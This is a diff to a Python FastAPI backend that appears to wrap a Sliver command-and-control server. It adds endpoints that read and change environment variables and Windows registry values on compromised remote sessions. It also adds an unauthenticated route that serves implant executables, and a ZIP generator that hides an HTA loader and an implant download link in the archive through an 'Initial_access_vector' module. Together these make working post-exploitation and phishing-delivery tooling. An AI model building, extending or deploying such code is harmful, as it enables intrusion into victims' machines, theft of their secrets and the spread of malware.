@@ -12,7 +12,7 @@ import time
 from fastapi import Query
 from fastapi.responses import JSONResponse
 import base64
-from fastapi.responses import Response
+from fastapi.responses import Response, FileResponse
 from datetime import datetime, timedelta, UTC
 from jose import JWTError, jwt
 import json
@@ -20,6 +20,16 @@ import geoip2.database
 import geoip2.errors
 from pathlib import Path
 from collections import defaultdict
+import os
+from Initial_access_vector import (
+    EGG,
+    TXT_FILE_PATH,
+    find_eocd_offset,
+    update_eocd_cd_offset,
+    create_hta_file,
+    create_zip_with_hta,
+    inject_txt_into_zip
+)
 
 # Import local modules using direct imports since we're running from v1 directory
 from utils.geoip import GeoIPManager
@@ -1325,3 +1335,453 @@ async def list_network_connections(
             status_code=500,
             detail=f"Failed to get network connections: {str(e)}"
         )
+
+@app.get("/environment")
+async def get_environment_variables(
+    session_id: str = Query(..., description="Session ID to get environment variables from"),
+    name: Optional[str] = Query(None, description="Optional name of specific environment variable to get"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Get environment variables from the session"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Get environment variables from sliver session
+        env_vars = []
+        try:
+            if name:
+                # Get specific environment variable
+                env_info = await session.get_env(name)
+                if env_info and hasattr(env_info, 'Variables'):
+                    # Variables is a list of Key-Value pairs
+                    for var in env_info.Variables:
+                        if hasattr(var, 'Key') and hasattr(var, 'Value'):
+                            try:
+                                env_vars.append({
+                                    "name": str(var.Key),
+                                    "value": str(var.Value)
+                                })
+                            except Exception as var_err:
+                                print(f"Error processing environment variable: {var_err}")
+                                continue
+            else:
+                # Get all environment variables
+                env_info = await session.get_env("")
+                if env_info and hasattr(env_info, 'Variables'):
+                    # Variables is a list of Key-Value pairs
+                    for var in env_info.Variables:
+                        if hasattr(var, 'Key') and hasattr(var, 'Value'):
+                            try:
+                                env_vars.append({
+                                    "name": str(var.Key),
+                                    "value": str(var.Value)
+                                })
+                            except Exception as var_err:
+                                print(f"Error processing environment variable: {var_err}")
+                                continue
+            
+        except Exception as env_err:
+            print(f"Error accessing environment data: {env_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to access environment data: {str(env_err)}"
+            )
+            
+        return JSONResponse(
+            content={
+                "status": "success",
+                "environment": env_vars
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error getting environment variables: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to get environment variables: {str(e)}"
+        )
+
+@app.post("/environment")
+async def set_environment_variable(
+    session_id: str = Query(..., description="Session ID to set environment variable in"),
+    name: str = Query(..., description="Name of the environment variable"),
+    value: str = Query(..., description="Value of the environment variable"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Set an environment variable in the session"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Set environment variable
+        try:
+            result = await session.set_env(name, value)
+            result_str = str(result) if result is not None else None
+        except Exception as set_err:
+            print(f"Error setting environment variable value: {set_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to set environment variable value: {str(set_err)}"
+            )
+        
+        return JSONResponse(
+            content={
+                "status": "success",
+                "message": f"Environment variable {name} set successfully",
+                "result": result_str
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error in set environment variable operation: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to set environment variable: {str(e)}"
+        )
+
+@app.delete("/environment")
+async def unset_environment_variable(
+    session_id: str = Query(..., description="Session ID to unset environment variable in"),
+    name: str = Query(..., description="Name of the environment variable to unset"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Unset an environment variable in the session"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Unset environment variable
+        try:
+            result = await session.unset_env(name)
+            result_str = str(result) if result is not None else None
+        except Exception as unset_err:
+            print(f"Error unsetting environment variable value: {unset_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to unset environment variable value: {str(unset_err)}"
+            )
+        
+        return JSONResponse(
+            content={
+                "status": "success",
+                "message": f"Environment variable {name} unset successfully",
+                "result": result_str
+            }
+        )
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error in unset environment variable operation: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to unset environment variable: {str(e)}"
+        )
+
+@app.get("/registry")
+async def read_registry_value(
+    session_id: str = Query(..., description="Session ID to read registry from"),
+    hive: str = Query(..., description="Registry hive to read from (e.g., HKEY_LOCAL_MACHINE)"),
+    reg_path: str = Query(..., description="Path to registry key"),
+    key: str = Query(..., description="Key name to read"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Read a value from the remote system's registry (Windows only)"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Get hostname from session
+        hostname = session.hostname if hasattr(session, 'hostname') else None
+        if not hostname:
+            raise HTTPException(status_code=400, detail="Could not determine hostname from session")
+        
+        print(hostname)
+
+        # Read registry value
+        try:
+            result = await session.registry_read(
+                hive=hive,
+                reg_path=reg_path,
+                key=key,
+                hostname=hostname
+            )
+
+            # Handle both simple string values and complex registry value objects
+            if hasattr(result, 'Value'):
+                # Simple string value case
+                registry_data = {
+                    "hive": hive,
+                    "path": reg_path,
+                    "key": key,
+                    "value": {
+                        "type": "STRING",
+                        "string_value": result.Value,
+                        "dword_value": None,
+                        "qword_value": None,
+                        "byte_value": None
+                    }
+                }
+            else:
+                # Complex registry value object case
+                registry_data = {
+                    "hive": str(result.Hive) if hasattr(result, 'Hive') else None,
+                    "path": str(result.Path) if hasattr(result, 'Path') else None,
+                    "key": str(result.Key) if hasattr(result, 'Key') else None,
+                    "value": {
+                        "type": str(result.Value.Type) if hasattr(result, 'Value') and hasattr(result.Value, 'Type') else None,
+                        "string_value": str(result.Value) if hasattr(result, 'Value') and hasattr(result.Value, 'StringValue') else None,
+                        "dword_value": int(result.Value.DWordValue) if hasattr(result, 'Value') and hasattr(result.Value, 'DWordValue') else None,
+                        "qword_value": int(result.Value.QWordValue) if hasattr(result, 'Value') and hasattr(result.Value, 'QWordValue') else None,
+                        "byte_value": bytes(result.Value.ByteValue) if hasattr(result, 'Value') and hasattr(result.Value, 'ByteValue') else None
+                    }
+                }
+            
+            return JSONResponse(
+                content={
+                    "status": "success",
+                    "registry": registry_data
+                }
+            )
+            
+        except Exception as reg_err:
+            print(f"Error reading registry value: {reg_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to read registry value: {str(reg_err)}"
+            )
+            
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error in registry read operation: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to read registry value: {str(e)}"
+        )
+
+@app.post("/registry")
+async def write_registry_value(
+    session_id: str = Query(..., description="Session ID to write registry to"),
+    hive: str = Query(..., description="Registry hive to write to (e.g., HKEY_LOCAL_MACHINE)"),
+    reg_path: str = Query(..., description="Path to registry key"),
+    key: str = Query(..., description="Key name to write to"),
+    reg_type: str = Query(..., description="Type of registry value (STRING, DWORD, QWORD, BINARY)"),
+    string_value: Optional[str] = Query(None, description="String value (for STRING type)"),
+    dword_value: Optional[int] = Query(None, description="DWORD value (for DWORD type)"),
+    qword_value: Optional[int] = Query(None, description="QWORD value (for QWORD type)"),
+    byte_value: Optional[str] = Query(None, description="Binary value as hex string (for BINARY type)"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Write a value to the remote system's registry (Windows only)"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Get hostname from session
+        hostname = session.hostname if hasattr(session, 'hostname') else None
+        if not hostname:
+            raise HTTPException(status_code=400, detail="Could not determine hostname from session")
+        
+        print("hostname", hostname)
+
+        # Convert reg_type string to enum value
+        try:
+            reg_type_enum = client_pb2.RegistryType.Value(reg_type.upper())
+        except ValueError:
+            raise HTTPException(
+                status_code=400,
+                detail=f"Invalid registry type: {reg_type}. Must be one of: STRING, DWORD, QWORD, BINARY"
+            )
+        
+        # Validate value based on type
+        if reg_type.upper() == "STRING" and not string_value:
+            raise HTTPException(status_code=400, detail="String value required for STRING type")
+        elif reg_type.upper() == "DWORD" and dword_value is None:
+            raise HTTPException(status_code=400, detail="DWORD value required for DWORD type")
+        elif reg_type.upper() == "QWORD" and qword_value is None:
+            raise HTTPException(status_code=400, detail="QWORD value required for QWORD type")
+        elif reg_type.upper() == "BINARY" and not byte_value:
+            raise HTTPException(status_code=400, detail="Binary value required for BINARY type")
+        
+        # Convert byte_value from hex string if provided
+        byte_value_bytes = None
+        if byte_value:
+            try:
+                byte_value_bytes = bytes.fromhex(byte_value)
+            except ValueError:
+                raise HTTPException(status_code=400, detail="Invalid binary value format. Must be a valid hex string")
+        
+        # Write registry value
+        try:
+            result = await session.registry_write(
+                hive=hive,
+                reg_path=reg_path,
+                key=key,
+                hostname=hostname,
+                string_value=string_value or "",
+                byte_value=byte_value_bytes or b"",
+                dword_value=dword_value or 0,
+                qword_value=qword_value or 0,
+                reg_type=reg_type_enum
+            )
+            
+            return JSONResponse(
+                content={
+                    "status": "success",
+                    "message": f"Registry value written successfully",
+                    "result": str(result) if result else None
+                }
+            )
+            
+        except Exception as reg_err:
+            print(f"Error writing registry value: {reg_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to write registry value: {str(reg_err)}"
+            )
+            
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error in registry write operation: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to write registry value: {str(e)}"
+        )
+
+@app.post("/registry/create-key")
+async def create_registry_key(
+    session_id: str = Query(..., description="Session ID to create registry key in"),
+    hive: str = Query(..., description="Registry hive to create key in (e.g., HKEY_LOCAL_MACHINE)"),
+    reg_path: str = Query(..., description="Path to registry key"),
+    key: str = Query(..., description="Key name to create"),
+    current_user: User = Depends(get_current_active_user)
+):
+    """Create a registry key on the remote system (Windows only)"""
+    try:
+        # Get client instance
+        client = await get_client()
+        
+        # Get the session
+        session = await client.interact_session(session_id)
+        if not session:
+            raise HTTPException(status_code=404, detail="Session not found")
+        
+        # Get hostname from session
+        hostname = session.hostname if hasattr(session, 'hostname') else None
+        if not hostname:
+            raise HTTPException(status_code=400, detail="Could not determine hostname from session")
+        
+        # Create registry key
+        try:
+            result = await session.registry_create_key(
+                hive=hive,
+                reg_path=reg_path,
+                key=key,
+                hostname=hostname
+            )
+            
+            return JSONResponse(
+                content={
+                    "status": "success",
+                    "message": f"Registry key created successfully",
+                    "result": str(result) if result else None
+                }
+            )
+            
+        except Exception as reg_err:
+            print(f"Error creating registry key: {reg_err}")
+            raise HTTPException(
+                status_code=500,
+                detail=f"Failed to create registry key: {str(reg_err)}"
+            )
+            
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Error in registry create key operation: {str(e)}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Failed to create registry key: {str(e)}"
+        )
+
+@app.get("/download_implant_binary/{implant_name}")
+def download_file(implant_name: str):
+    file_path = os.path.join("implant_output/", implant_name)
+    return FileResponse(
+        path=file_path,
+        filename= implant_name+".exe",  # name it will have for the client
+        media_type="application/octet-stream"
+    )
+
+@app.get("/generatezip/")
+def generate_zip(
+    zipname: str = Query(..., description="Base name for the generated ZIP file"),
+    implant_name : str = Query(..., description="Text file name")
+):
+    print("req came")
+    print(TXT_FILE_PATH)
+    if not os.path.exists(TXT_FILE_PATH):
+        print("path does not exists")
+        # make a text file on run time that has data = "http://localhost:8000/implant_name"
+        raise HTTPException(status_code=404, detail="Text file not found on server.")
+
+    with open(TXT_FILE_PATH, 'w') as file:
+        file.write("http://localhost:8000/download_implant_binary/"+implant_name)
+
+    payload_size = os.path.getsize(TXT_FILE_PATH)
+    hta_file = create_hta_file(zipname, payload_size)
+    zip_file_name = f"{zipname}.zip"
+
+    print("check1")
+
+    try:
+        print("check5")
+        create_zip_with_hta(zip_file_name, hta_file)
+        print("check6")
+        inject_txt_into_zip(zip_file_name, TXT_FILE_PATH)
+    except Exception as e:
+        print("check2")
+        raise HTTPException(status_code=500, detail=f"Error creating ZIP: {str(e)}")
+    finally:
+        print("check3")
+        if os.path.exists(hta_file):
+            os.remove(hta_file)
+
+    print("check4")
+    if not os.path.exists(zip_file_name):
+        raise HTTPException(status_code=500, detail="ZIP file generation failed.")
+
+    return FileResponse(zip_file_name, filename=zip_file_name, media_type='application/zip')
+
